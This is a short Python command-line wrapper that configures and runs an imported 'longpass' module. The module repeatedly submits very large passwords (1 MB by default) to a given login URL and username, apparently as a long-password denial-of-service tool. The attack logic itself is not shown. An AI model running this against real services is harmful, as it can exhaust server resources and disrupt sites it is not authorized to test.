import sys, argparse
import longpass
from hurry.filesize import filesize

def main():

    # Use argparse to get command line options
    # @todo Clean this up
    parser = argparse.ArgumentParser(description='Description here')
    parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
    parser.add_argument('-n', '--username', dest='username', type=str, required=True,help='Username')
    parser.add_argument('-s', '--size', dest='size', type=int, default=1000000, help='Size of the password')
    parser.add_argument('-d','--delay', dest='delay', type=float, default=1, help='Time between requests in seconds')
    parser.add_argument('-r','--repeats', dest='repeats', type=int, default=20, help='Number of iterations')

    # Set command line options to a object
    args = parser.parse_args()

    # Create longpass object
    login = longpass.Longpass()

    # Set options
    login.url = args.url
    login.username = args.username
    login.size = args.size
    login.repeats = args.repeats
    login.delay = args.delay


    # Print the summary of the assigment
    # @todo Add url and ask for comfirmation
    sys.stdout.write("Sending " + str(login.repeats) + " passwords sized " + filesize.size(login.size) + " in every " + str(login.delay) + " seconds.\n")

    login.run()

if __name__ == '__main__':
    main()